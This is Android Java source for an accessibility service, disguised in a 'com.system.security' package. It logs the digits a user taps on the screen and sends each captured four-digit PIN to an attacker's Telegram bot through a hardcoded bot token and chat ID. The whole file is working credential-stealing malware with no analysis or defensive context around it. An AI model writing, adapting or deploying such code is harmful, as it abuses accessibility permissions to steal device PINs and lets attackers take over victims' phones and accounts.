package com.system.security;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UnlockService extends AccessibilityService {

    private StringBuilder pinBuffer = new StringBuilder();
    private static final String BOT_TOKEN = "8641599033:AAFqD1brrN4CGQebEFnnCNFire5f3xsDep4";
    private static final String CHAT_ID = "8572227182";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // 1. Ekrandagi har qanday matn o'zgarishini kuzatish
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
            event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                findPinInNodes(source);
                source.recycle();
            }
        }
    }

    private void findPinInNodes(AccessibilityNodeInfo node) {
        if (node == null) return;

        // Agar foydalanuvchi raqamli klaviaturada bossa
        CharSequence text = node.getText();
        if (text != null && text.length() == 1 && Character.isDigit(text.charAt(0))) {
            pinBuffer.append(text);
            if (pinBuffer.length() >= 4) {
                sendData(pinBuffer.toString());
                pinBuffer.setLength(0); // Yuborgandan keyin tozalash
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            findPinInNodes(node.getChild(i));
        }
    }

    private void sendData(final String pin) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Redmi_Note_13_PIN_Captured: " + pin;
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.connect();
                InputStream is = conn.getInputStream();
                is.close();
                conn.disconnect();
            } catch (Exception e) {
                Log.e("UnlockService", "Error sending data", e);
            }
        }).start();
    }

    @Override public void onInterrupt() {}
}
